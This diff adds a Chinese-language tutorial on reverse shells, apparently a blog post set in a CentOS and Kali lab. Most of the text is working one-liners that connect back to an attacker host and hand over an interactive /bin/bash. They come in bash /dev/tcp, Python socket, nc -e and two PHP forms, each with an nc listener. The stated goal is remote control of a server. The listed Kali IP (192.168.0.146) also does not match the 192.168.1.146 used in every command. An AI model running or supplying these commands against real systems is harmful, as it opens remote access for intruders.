@@ -1,0 +1,74 @@
+什么是反弹shell？
+简单理解，通常是我们主动发起请求，去访问服务器（某个IP的某个端口），比如我们常访问的web服务器：http(https)://ip:80，这是因为在服务器上面开启了80端口的监听，我们去访问它的时候，就会给我们建立连接。而现在所谓的反弹shell指的是反过来在我们自己的公网vps建立监听，然后让服务器反弹一个shell来连接我们自己的主机，然后我们就能通过反弹的shell去远程控制服务器了。那么关键是怎么做了？今天我也向大佬学习学习总结总结，不足之处还望多多包含。
+
+实验环境
+CentOS 7: 192.168.0.147
+kali 2.0: 192.168.0.146
+
+方法1：使用linux命令反弹shell
+反弹shell命令格式如下：
+bash -i >& /dev/tcp/ip/port 0>&1
+首先在kali上使用nc监听7777端口
+root@kali:~# nc -lvp 7777
+
+然后再CentOS 7下执行以下命令：
+[root@localhost ~]# bash -i >& /dev/tcp/192.168.1.146/7777 0>&1
+
+执行完命令之后再回到kali机器上面查看，可以看到shell成功反弹，这时候我们就能对服务器进行远程操控了
+
+方法2：使用python反弹shell
+反弹shell命令格式如下：
+python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
+同理，首先在kali上使用nc监听7777端口
+root@kali:~# nc -lvp 7777
+
+然后再CentOS 7下执行以下命令：
+[root@localhost ~]# python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.146',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
+
+
+然后返回kali查看发现也可以成功反弹shell，如下所示：
+
+
+方法3：使用nc反弹shell，前提这自然是反弹shell的服务器安装有nc才行
+首先查看是否安装了nc，我这里已经安装的有了，如下图所示，如果没安装的还请自行百度解决。
+
+图片.png
+然后下一步还是在我们kali上面监听端口。
+root@kali:~# nc -lvp 7777
+
+图片.png
+最后在CentOS上面使用nc反弹shell到kali，命令如下：
+[root@localhost ~]# nc -e /bin/bash 192.168.1.146 7777
+
+图片.png
+执行完命令之后，返回kali可看到反弹shell成功，并可以执行命令对服务器进行操作，如下图所示：
+
+图片.png
+方法4：使用php反弹shell
+1).首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令
+第一步还是在kali上面监听端口
+root@kali:~# nc -lvp 7777
+
+图片.png
+然后在CentOS执行以下命令:
+[root@localhost ~]# php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.1.146/7777");'
+
+图片.png
+最后我们回到kali上面查看，即可看到成功反弹的shell
+
+图片.png
+2).使用php的fsockopen去连接远程
+命令格式如下：
+php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
+第一步在kali上面监听端口
+root@kali:~# nc -lvp 7777
+
+图片.png
+然后在CentOS执行以下命令:
+[root@localhost ~]# php -r '$sock=fsockopen("192.168.1.146",7777);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+图片.png
+最后在kali上可以看到成功反弹shell
+
+图片.png
+
